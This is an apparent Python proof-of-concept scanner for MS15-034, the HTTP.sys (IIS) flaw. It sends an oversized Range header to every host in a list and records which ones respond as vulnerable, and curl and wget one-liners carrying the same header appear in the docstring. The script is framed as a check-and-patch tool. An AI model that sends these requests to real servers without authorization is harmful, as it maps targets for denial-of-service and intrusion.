#!/usr/bin/env python
import requests

"""
@Zigoo0
Another testing methods.
curl -v [ipaddress]/ -H "Host: test" -H "Range: bytes=0-18446744073709551615"
wget -O /dev/null --header="Range: 0-18446744073709551615" http://[ip address]/
"""
# Coloring class
class colors:
	def __init__(self):
		self.green = "\033[92m"
		self.blue = "\033[94m"
		self.bold = "\033[1m"
		self.yellow = "\033[93m"
		self.red = "\033[91m"
		self.end = "\033[0m"
color = colors()

banner = color.green+'''
This is a test POC for:
MS15-034: HTTP.sys (IIS) DoS And Possible Remote Code Execution.
By Ebrahim Hegazy @Zigoo0 \n'''+color.end

print banner
#Reading hosts from a text file to test multiple sites.
hosts = open(raw_input('[*] Enter the name of the list file: ')).readlines()
#Vulnerable hosts will go here.
vulnerable = set()
#Fixed hosts will go here.
fixed = set()

#Defining the main function.
def main(url):
	print color.green+"[*] Testing "+color.end + url
	try:
		#Defining the Headers.
		headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0", 
					"Accept-Encoding": "gzip, deflate",
					"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
					"Range": "bytes=0-18446744073709551615",
					"Referer": "https://github.com/zigoo0/", 
					"Connection": "keep-alive"
					}
		#Sending the Request.
		r = requests.get(url, headers=headers, verify=False, timeout=5)
		if r.status_code == 416 or "Requested Range Not Satisfiable" in r.text:
			#print r.status_code.
			print "[*] %s"%(url) + color.red+" is Vulnerable!\n"+color.end
			#Adding the vulnerable hosts to a SET for later use and to make sure it's a unique host.
			vulnerable.add(url)
		else:
			#print r.status_code
			print "[*] Seems %s "%(url) + color.green+" is not vulnerable!\n"+color.end
			#Adding the non-vulnerable hosts to a SET for later use.
			fixed.add(url)
	except Exception:
		pass


if __name__ == "__main__":
	for host in hosts:
		url = host.strip()
		main(url)
	#Printing the list of vulnerable sites.
	print color.red+"[*] %s found to be vulnerable."%(len(vulnerable)) +color.end
	for vuln in vulnerable:
		print "[-] ", vuln
		#Adding the vulnerable sites to a text file.
		vulnz = open('vulnerable-hosts.txt', 'a')
		vulnz.write(vuln+"\n")
	print color.blue+"[*] Vulnerable hosts added to "+color.end + "vulnerable-hosts.txt"
	#Printing the number of fixed/not-vulnerable hosts.
	print color.green+"\n[*] %s found to be NOT vulnerable."%(len(fixed)) +color.end
	#printing the refferences.
	print color.green+"\n[*] Please follow below link for more details about this vulnerabability and How to FIX it."+color.end
	print "[*] https://technet.microsoft.com/library/security/ms15-034"
	print "[*] https://technet.microsoft.com/en-us/library/security/ms15-apr.aspx"
	print color.green+"[*] Don't forget to update your servers.\n"+color.end





